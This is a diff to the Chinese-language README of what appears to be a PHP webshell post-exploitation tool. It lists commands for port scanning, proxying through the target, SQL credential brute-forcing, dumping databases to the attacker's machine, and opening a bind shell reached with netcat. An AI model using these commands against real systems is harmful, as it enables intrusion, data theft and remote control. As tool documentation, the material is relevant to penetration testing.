@@ -27,18 +27,19 @@
   * 压缩文件命令`:file_gzip site.gz ./` 只支持linux
   * 搜索内容命令`:file_grep ./ "pass"` 不建议搜索大目录
 * net网络请求
-  * 端口扫描
-    * 工具命令`nmap 127.0.0.1 21,22,80,443,1433,3306,3389,7001` 功能使用PHP函数fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
+  * 端口扫描 - 使用PHP函数[fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
+    * 工具命令`:net_scan 127.0.0.1 21,22,80,443,1433,3306,3389,7001`
   * proxy
     * 工具命令`:net_proxy` 使用目标主机发起http(s)请求
     * 工具命令`:net_curl http://ipconfig.io/json`  模拟curl 使用目标主机发起http(s)请求
 * DB数据库操作
-  * SQL交互命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句如`show databases;`
+  * SQL交互
+    * 工具命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句如`show databases;`
   * 暴力枚举数据库用户名和口令 只支持mysql和pgsql
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users root -pwds db123456 admin123` 简单枚举 成功会出现`root:pass`
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`字典枚举
-  * dump数据库  支持mysql,pgsql,sqlite,dblib
-    * 工具命令`:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306 -lpath /Users/xxx/Downloads/dump1.sql` 把数据库dump 保存到本地`dump1.sql`
+  * dump数据库到本地 支持mysql,pgsql,sqlite,dblib
+    * 工具命令`:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306` 把数据库dump 下载保存到本地目录`/var`下. 可指定保存为本地文件`-lpath /Users/xxx/Downloads/db1.sqldump`
 * 派生shell
   * 正向shell`:backdoor_tcp`
     * 工具命令`:backdoor_tcp 8811 -vector netcat` 在目标主机(被控端)公网IP上开启端口监听 1.1.1.1:8811   主控端执行`nc 1.1.1.1 8811`
